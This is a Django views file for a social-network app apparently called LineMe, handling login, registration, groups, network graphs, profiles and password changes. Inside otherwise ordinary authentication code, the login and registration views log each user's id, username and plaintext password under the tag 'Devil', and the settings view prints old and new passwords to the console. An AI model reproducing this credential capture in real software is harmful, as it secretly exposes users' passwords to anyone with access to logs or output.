import ast
import json

from django.contrib.auth import logout, authenticate
from django.contrib.auth.decorators import login_required
from django.core.paginator import PageNotAnInteger
from django.core.paginator import Paginator, EmptyPage
from django.db.models import Q
from django.http import HttpResponse, JsonResponse
from django.shortcuts import redirect, render, get_object_or_404
from django.utils import timezone

from Human.forms import LoginForm, RegisterForm, GroupCreateForm, GroupMemberCreateForm, JoinForm, \
    FileUploadForm
from Human.methods.avatar import create_avatar, handle_avatar
from Human.methods.lm_ego import get_user_ego_graph
from Human.methods.group import get_group_joined_num, group_recommender, create_group, get_user_join_status, \
    get_user_member_in_group
from Human.methods.groupmember import member_recommender, create_group_member, member_join, member_join_request, \
    create_group_member_from_file
from Human.methods.link import link_confirm, update_links
from Human.methods.link import link_reject
from Human.methods.lm_global import get_user_global_info, get_user_global_graph, get_user_global_map
from Human.methods.profile import update_profile
from Human.methods.session import get_session_id, get_session_consume
from Human.methods.user import create_user, get_user_groups, get_user_msgs_count, get_user_msgs, get_user_invs, \
    get_user_name
from Human.methods.utils import smart_search, login_user, logger_join, input_filter
from Human.methods.validation import check_groupid, validate_profile, validate_passwd
from Human.models import Group, GroupMember, MemberRequest
from LineMe.constants import PROJECT_NAME, IDENTIFIER, CITIES_TABLE, GROUP_CREATED_CREDITS_COST
from LineMe.settings import logger


# Todo: ///check all place with user input///, deal with utf-8 chinese, check all filter to get
# Todo: member in group multiple?


def redirect2main(request):
    return redirect('home')


def search(request):

    if not request.user.is_authenticated():
        return HttpResponse(json.dumps([]))

    kw = request.GET.get('kw')
    kw = input_filter(kw)
    groupid = request.GET.get('gid')
    return HttpResponse(json.dumps(smart_search(request, kw, groupid, 5)))


########################################################################

def lm_login(request):

    if request.user.is_authenticated():
        return redirect('home')

    context = {"project_name": PROJECT_NAME, "status": ''}

    if request.method == 'GET':
        return render(request, 'Human/login.html', context)

    elif request.method == 'POST':
        lf = LoginForm(request.POST)

        if lf.is_valid():
            username = lf.cleaned_data['username']
            password = lf.cleaned_data['password']

            if login_user(request, username, password):

                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
                logger.info(logger_join('Login', get_session_id(request)))

                return redirect('home')

        context["status"] = -1
        return render(request, 'Human/login.html', context)

    else:
        return HttpResponse(status=403)


def lm_logout(request):
    logger.info(logger_join('Logout', get_session_id(request)))
    logout(request)
    return redirect('login')


def lm_register(request):

    context = {"project_name": PROJECT_NAME, "status": 0}

    if request.method == 'GET':
        return render(request, 'Human/register.html', context)

    elif request.method == 'POST':
        rf = RegisterForm(request.POST)

        if rf.is_valid():
            name = rf.cleaned_data['username']
            email = rf.cleaned_data['email']
            password = rf.cleaned_data['password']
            password2 = rf.cleaned_data['password2']

            status = create_user(request, name, email, password, password2)
            context["status"] = status

            if status == 0:
                request.session['NewLogin'] = True
                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), name, password]) + ']'))
                return redirect('profile')

            else:
                return render(request, 'Human/register.html', context)
        else:
            context["status"] = -4
            return render(request, 'Human/register.html', context)

    else:
        return HttpResponse(status=403)


########################################################################

@login_required
def home(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    groups = get_user_groups(user)

    my_groups, in_groups = {}, {}

    for group in groups:
        if group.creator == user:
            my_groups[group] = get_group_joined_num(group)
        else:
            in_groups[group] = get_group_joined_num(group)

    msgs_count = get_user_msgs_count(user)
    rcmd_groups = group_recommender(user)

    context = {"project_name": PROJECT_NAME, "user": user, "my_groups": my_groups,
               "in_groups": in_groups, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count,
               "group_created_status": 0, "identifier": IDENTIFIER, 'group_cost': GROUP_CREATED_CREDITS_COST}

    if request.method == 'GET':
        return render(request, 'Human/home.html', context)

    elif request.method == 'POST':
        gf = GroupCreateForm(request.POST)

        if gf.is_valid():
            name = gf.cleaned_data['name']
            identifier = int(gf.cleaned_data['identifier'])
            gtype = int(gf.cleaned_data['gtype'])

            status = create_group(request, user, name, identifier, gtype)
            context["group_created_status"] = status

            if status == 0:
                groupid = Group.objects.get(group_name=name).id
                return redirect('group', groupid=groupid)

            else:
                return render(request, 'Human/home.html', context)

        context["group_created_status"] = -4
        return render(request, 'Human/home.html', context)

    else:
        return HttpResponse(status=403)


@login_required
def msg_panel(request):
    user = request.user

    if request.is_ajax():

        page = request.GET.get('page')

        msgs = get_user_msgs(user)

        paginator = Paginator(msgs, 10)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        my_members = GroupMember.objects.filter(user=user)

        msg_creators = {xp: GroupMember.objects.get(user=xp.creator, group=xp.group).member_name for xp in p}

        return render(request, 'Human/home_msg.html',
                      {'msgs': p, 'my_members': my_members, 'msg_creators': msg_creators})
    else:
        return HttpResponse(status=403)


@login_required
def msg_handle(request, mtype='0', linkid=0):
    user = request.user

    if request.method == 'GET':

        if mtype == '1':
            status = link_confirm(request, user, int(linkid))
        elif mtype == '0':
            status = link_reject(request, user, int(linkid))
        else:
            return HttpResponse(status=403)

        return HttpResponse(status)

    elif request.is_ajax():
        links = request.POST.get('linkids')

        confirm_list = json.loads(links)

        count = 0
        for link in confirm_list:
            status = link_confirm(request, user, int(link))
            if status == 0:
                count += 1

        return HttpResponse(count)

    else:
        return HttpResponse(status=403)


@login_required
def inv_panel(request):
    user = request.user

    if request.is_ajax():

        page = request.GET.get('page')

        group_name = request.GET.get('groupname')
        group_name = input_filter(group_name)

        if group_name:
            invs = get_user_invs(user, group_name)
        else:
            invs = get_user_invs(user)

        paginator = Paginator(invs, 8)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        my_members = GroupMember.objects.filter(user=user)

        return render(request, 'Human/home_inv.html', {'invs': p, 'my_members': my_members})
    else:
        return HttpResponse(status=403)


# Todo: implement email sender
@login_required
def send_email2unconfirmed(request):
    return 0


########################################################################

@login_required
def ego_network(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groups = get_user_groups(user)
    rcmd_groups = group_recommender(user)
    msgs_count = get_user_msgs_count(user)

    groupid = check_groupid(user, groupid)
    if groupid == 0:
        group = None
    else:
        group = get_object_or_404(Group, id=groupid)

    context = {"project_name": PROJECT_NAME, "user": user, "groups": groups,
               "group": group, "rcmd_groups": rcmd_groups, "msgs_count": msgs_count}

    return render(request, 'Human/ego.html', context)


@login_required
def ego_graph(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)
    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_ego_graph(user, groupid)

    return JsonResponse(data, safe=False)


@login_required
def rcmd_panel(request, groupid):
    user = request.user

    if request.is_ajax():

        page = request.GET.get('page')

        groupid = check_groupid(user, groupid)
        if groupid == 0:
            return render(request, 'Human/ego_rcmd.html')

        rcmd_gms = member_recommender(user, groupid)

        paginator = Paginator(rcmd_gms, 6)

        try:
            p = paginator.page(page)
        except PageNotAnInteger:
            p = paginator.page(1)
        except EmptyPage:
            p = paginator.page(paginator.num_pages)

        return render(request, 'Human/ego_rcmd.html', {'members': p})
    else:
        return HttpResponse(status=403)


@login_required
def update_graph(request, groupid):
    user = request.user

    if request.is_ajax():
        new_links = request.POST.get('links')
        status = update_links(request, new_links, user, groupid)
        return HttpResponse(status)

    else:
        return HttpResponse(status=403)


########################################################################

@login_required
def global_network(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groups = get_user_groups(user)
    msgs_count = get_user_msgs_count(user)
    groupid = check_groupid(user, groupid)

    context = {}
    if groupid == 0:
        group = None
    else:
        group = get_object_or_404(Group, id=groupid)
        context.update(get_user_global_info(user, groupid))

    context.update({"project_name": PROJECT_NAME, "user": user, "groups": groups,
                    "group": group, "msgs_count": msgs_count})

    return render(request, 'Human/global.html', context)


@login_required
def global_graph(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)

    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_global_graph(user, groupid)

    return JsonResponse(data, safe=False)


@login_required
def global_map(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    user = request.user
    groupid = check_groupid(user, groupid)

    if groupid == 0:
        return JsonResponse({"nodes": None, "links": None}, safe=False)

    data = get_user_global_map(user, groupid)

    return JsonResponse(data, safe=False)


########################################################################

@login_required
def profile(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    username = get_user_name(user)
    msgs_count = get_user_msgs_count(user)

    first_login = get_session_consume(request, 'NewLogin')

    if user.extra.location:
        country, city = user.extra.location.split('-')
    else:
        country, city = "", ""

    context = {"project_name": PROJECT_NAME, "user": user, "username": username, "msgs_count": msgs_count,
               "first_login": first_login, 'cities_table': CITIES_TABLE, 'country': country, 'city': city}

    if request.is_ajax():
        first_name = request.POST.get('firstname')
        last_name = request.POST.get('lastname')
        birth = request.POST.get('birth')
        gender = int(request.POST.get('gender'))
        country = request.POST.get('country')
        city = request.POST.get('city')
        institution = request.POST.get('institution')

        # print country, city

        if validate_profile(first_name, last_name, birth, gender, country, city, institution):
            country, city = country.replace('-', ' '), city.replace('-', ' ')
            if update_profile(request, user, first_name, last_name, birth, gender, country, city, institution) == 0:
                if first_login:
                    create_avatar(request, user.id, username=first_name + ' ' + last_name)

                return HttpResponse(0)

        else:
            return HttpResponse(-1)

    return render(request, 'Human/profile.html', context)


########################################################################

@login_required
def settings(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user

    if request.method == 'GET':
        msgs_count = get_user_msgs_count(user)

        context = {"project_name": PROJECT_NAME, "user": user, "msgs_count": msgs_count}
        return render(request, 'Human/settings.html', context)

    elif request.is_ajax():

        # pws = request.POST.get('passwords')
        #
        # passwords = json.loads(pws)
        #
        # if len(passwords) != 3:
        #     return HttpResponse(-1)

        passwd = request.POST.get('old')
        new_passwd = request.POST.get('new')
        new_passwd2 = request.POST.get('new2')

        print passwd, new_passwd, new_passwd2

        if user.check_password(passwd):
            if validate_passwd(new_passwd, new_passwd2):
                user.set_password(new_passwd)
                user.save()

                logger.info(logger_join('Reset', get_session_id(request)))
                logger.info(logger_join('Logout', get_session_id(request)))
                logout(request)

                return HttpResponse(0)

        return HttpResponse(-1)

    else:
        return HttpResponse(status=403)


########################################################################

@login_required
def avatar(request):
    logger.info(logger_join('Access', get_session_id(request)))

    user = request.user
    msgs_count = get_user_msgs_count(user)

    context = {"project_name": PROJECT_NAME, "user": user, "msgs_count": msgs_count}
    return render(request, 'Human/avatar.html', context)


@login_required
def img_handle(request):
    if request.is_ajax():

        status = handle_avatar(request)
        return HttpResponse(status)

    else:
        return HttpResponse(status=403)


########################################################################


# Todo: learn from ego and global
@login_required
def manage_group(request, groupid=0):
    logger.info(logger_join('Access', get_session_id(request), gid=groupid))

    # Todo: implement errorname and updatestat
    fs = get_session_consume(request, 'FileStat')
    mn = get_session_consume(request, 'MemName')
    us = get_session_consume(request, 'UpdateStat')

    # if not us:
    #     fs = mn

    user = request.user
    groups = get_user_groups(user)
    rcmd_groups = group_recommender(user)
    msgs_count = get_user_msgs_count(user)

    group = get_object_or_404(Group, id=groupid)

    context = {"project_name": PROJECT_NAME, "user": user, "group": group, "groups": groups,
               "rcmd_groups": rcmd_groups, "update_status": fs, "name": mn, "msgs_count": msgs_count}

    if request.method == 'GET':
        if user != group.creator:
            members = GroupMember.objects.filter(group=group)
            members_count = members.count()

            follow_status = get_user_join_status(request, user, group)
            context.update({'creator': group.creator, 'members_count': members_count, 'follow_status': follow_status})
            return render(request, 'Human/group2.html', context)

        else:

            mpage = request.GET.get('mpage')

            # Todo: implement request paginator
            rpage = request.GET.get('rpage')

            members = GroupMember.objects.filter(group=group).order_by('-created_time')
            request_members = MemberRequest.objects.filter(group=group).exclude(is_valid=False)
            paginator = Paginator(members, 15)

            try:
                p = paginator.page(mpage)
            except PageNotAnInteger:
                p = paginator.page(1)
            except EmptyPage:
                p = paginator.page(paginator.num_pages)

            members_count = members.count()
            context.update({'members': p, 'creator': user, 'members_count': members_count, 'requests': request_members})
            return render(request, 'Human/group1.html', context)

    elif request.method == 'POST':
        gf = GroupMemberCreateForm(request.POST)

        if gf.is_valid():
            name = gf.cleaned_data['name']
            identifier = gf.cleaned_data['identifier']
            status = create_group_member(request, group, name, identifier)

            if status != 0:
                request.session['MemName'] = name
                request.session['UpdateStat'] = False
            else:
                request.session['MemName'] = name
                request.session['UpdateStat'] = True

            return redirect('group', groupid)

    else:
        return HttpResponse(status=403)


# Todo: check check
@login_required
def join(request, groupid):

    """
    :param request:
    :param groupid:
    :return status code
     403: already in this group
     0: success
    -1: failed
    -2: member not existed
    -3: more than maxsize
    -4: internal error
    """

    user = request.user
    group = get_object_or_404(Group, id=groupid)

    # already in the group
    if get_user_join_status(request, user, group) == 1:
        return HttpResponse(status=403)

    if request.is_ajax():

        if group.identifier == 2:
            if get_user_join_status(request, user, group) == 0:
                status = create_group_member(request,
                                             group,
                                             get_user_name(user),
                                             'no validation',
                                             user=user,
                                             is_joined=True)

                return HttpResponse(status)
            else:
                logger.warning(logger_join('Join', get_session_id(request), 'failed'))
                return HttpResponse(-4)

        elif group.identifier == 1:
            gm = get_user_member_in_group(user, group)

            if not gm:
                return HttpResponse(-2)

            status = member_join(request, user, group, user.email)
            if status != 0:
                logger.warning(logger_join('Join', get_session_id(request), 'failed'))

            return HttpResponse(status)

        elif group.identifier == 0:
            gm = get_user_member_in_group(user, group)

            if not gm:
                return HttpResponse(-2)
            else:
                return HttpResponse(-1)

    elif request.method == 'POST':
        jf = JoinForm(request.POST)

        if jf.is_valid():
            identifier = jf.cleaned_data['identifier']

            if identifier != '':
                status = member_join(request, user, group, identifier)
                if status == 0:
                    return redirect('egoId', groupid=groupid)

        request.session['join_failed'] = True
        logger.warning(logger_join('Join', get_session_id(request), 'failed'))
        return redirect('group', groupid=groupid)

    else:
        return HttpResponse(status=403)


@login_required
def join_request(request, groupid):

    user = request.user
    group = get_object_or_404(Group, id=groupid)

    if request.method == 'POST' and not GroupMember.objects.filter(user=user, group=group).exists():
        mesg = request.POST.get('message')
        status = member_join_request(request, user, group, mesg)
        return redirect('group', groupid=groupid)

    else:
        return HttpResponse(status=403)


# Todo: if the member is existed, sth is wrong
@login_required
def join_confirm(request, groupid, requestid):

    user = request.user
    group = get_object_or_404(Group, id=groupid)

    if request.method == 'GET' and group.creator == user:

        mr = get_object_or_404(MemberRequest, id=requestid, group=group)
        mr.is_valid = False
        mr.save()

        status = create_group_member(request, group, get_user_name(mr.user), 'accepted', mr.user, is_joined=True)

        if status == 0:
            m = GroupMember.objects.get(group=group, user=user)
            m.is_joined = True
            m.save()
            return redirect('group', groupid)
        else:

            # Todo: confirm failed
            return redirect('group', groupid)
    else:
        return HttpResponse(status=403)


@login_required
def upload_members(request, groupid):
    user = request.user

    if Group.objects.filter(creator=user, id=groupid).exists():
        group = Group.objects.get(id=groupid)

        if request.method == 'POST':
            fuf = FileUploadForm(request.POST, request.FILES)
            if fuf.is_valid():

                status = create_group_member_from_file(request, group)
                if status != 0:
                    request.session['FileStat'] = False
                    request.session['ErrorName'] = status
                    return redirect('group', groupid=groupid)
                else:

                    request.session['FileStat'] = True
                    return redirect('group', groupid=groupid)
            else:
                request.session['FileStat'] = False
                return redirect('group', groupid=groupid)

    else:

        return redirect('group', groupid=groupid)
